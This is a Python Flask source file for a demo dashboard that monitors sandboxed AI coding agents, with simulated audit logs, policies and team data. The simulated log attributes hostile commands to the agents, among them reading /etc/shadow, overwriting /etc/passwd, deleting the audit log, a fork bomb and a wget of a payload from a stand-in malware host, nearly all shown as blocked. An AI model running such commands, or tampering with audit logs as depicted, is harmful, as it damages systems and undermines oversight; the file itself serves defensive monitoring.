#!/usr/bin/env python3
"""NemoClaw Dashboard - Full Demo with Bells & Whistles"""

from flask import Flask, render_template, jsonify, request
import json
import os
from datetime import datetime, timedelta
import random

app = Flask(__name__)

# Demo data (simulated for demo purposes)
ACTIVE_SANDBOKES = [
    {"id": "sb-001", "name": "cursor-agent-1", "status": "running", "uptime": "2h 15m", "blocks": 23},
    {"id": "sb-002", "name": "claude-code-prod", "status": "running", "uptime": "5h 42m", "blocks": 67},
    {"id": "sb-003", "name": "aider-dev", "status": "paused", "uptime": "1h 8m", "blocks": 12},
]

AUDIT_LOGS = [
    {"timestamp": "2026-03-17T18:42:15Z", "sandbox": "cursor-agent-1", "type": "filesystem", "command": "echo 'hacked' > /etc/passwd", "status": "BLOCKED", "reason": "Read-only filesystem"},
    {"timestamp": "2026-03-17T18:41:33Z", "sandbox": "claude-code-prod", "type": "network", "command": "curl https://google.com", "status": "BLOCKED", "reason": "Egress proxy: blocked domain"},
    {"timestamp": "2026-03-17T18:39:22Z", "sandbox": "aider-dev", "type": "privilege", "command": "whoami && id", "status": "ALLOWED", "reason": "Unprivileged user (uid=998)"},
    {"timestamp": "2026-03-17T18:37:11Z", "sandbox": "cursor-agent-1", "type": "binary", "command": "cp /usr/bin/node /tmp/evil", "status": "BLOCKED", "reason": "Binary execution blocked"},
    {"timestamp": "2026-03-17T18:35:45Z", "sandbox": "claude-code-prod", "type": "logs", "command": "rm -f /var/log/audit.log", "status": "BLOCKED", "reason": "Audit log protection"},
    {"timestamp": "2026-03-17T18:33:28Z", "sandbox": "aider-dev", "type": "resource", "command": ":(){ :|:& };:", "status": "BLOCKED", "reason": "Fork bomb detected"},
    {"timestamp": "2026-03-17T18:31:15Z", "sandbox": "cursor-agent-1", "type": "filesystem", "command": "cat /etc/shadow", "status": "BLOCKED", "reason": "Permission denied"},
    {"timestamp": "2026-03-17T18:29:42Z", "sandbox": "claude-code-prod", "type": "network", "command": "wget http://malware.site/payload.sh", "status": "BLOCKED", "reason": "Domain blocklist"},
]

POLICIES = {
    "filesystem": {"enabled": True, "description": "Read-only except /tmp, /workspace", "blocks": 45},
    "network": {"enabled": True, "description": "Egress proxy with domain blocklist", "blocks": 89},
    "privilege": {"enabled": True, "description": "Unprivileged user (uid=998)", "blocks": 12},
    "binary": {"enabled": True, "description": "No binary execution", "blocks": 34},
    "resource": {"enabled": True, "description": "CPU/memory/fork limits", "blocks": 23},
    "logs": {"enabled": True, "description": "Audit log protection", "blocks": 8},
}

TEAM_MEMBERS = [
    {"id": "u-001", "name": "Mike (Admin)", "email": "mike@cortanasolutions.com", "role": "admin", "status": "active"},
    {"id": "u-002", "name": "Dev User 1", "email": "dev1@customer.com", "role": "developer", "status": "active"},
    {"id": "u-003", "name": "Dev User 2", "email": "dev2@customer.com", "role": "developer", "status": "active"},
    {"id": "u-004", "name": "Security Admin", "email": "security@customer.com", "role": "security", "status": "active"},
]

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/audit')
def audit():
    return render_template('audit.html')

@app.route('/policies')
def policies():
    return render_template('policies.html')

@app.route('/team')
def team():
    return render_template('team.html')

@app.route('/api/stats')
def api_stats():
    return jsonify({
        "active_sandboxes": len([s for s in ACTIVE_SANDBOKES if s["status"] == "running"]),
        "blocks_today": random.randint(150, 250),
        "blocks_this_week": random.randint(800, 1200),
        "high_risk_attempts": random.randint(30, 60),
        "total_policies": 6,
        "team_members": len(TEAM_MEMBERS),
    })

@app.route('/api/sandboxes')
def api_sandboxes():
    return jsonify(ACTIVE_SANDBOKES)

@app.route('/api/audit')
def api_audit():
    limit = request.args.get('limit', 50)
    return jsonify(AUDIT_LOGS[:int(limit)])

@app.route('/api/policies')
def api_policies():
    return jsonify(POLICIES)

@app.route('/api/team')
def api_team():
    return jsonify(TEAM_MEMBERS)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8085, debug=False)
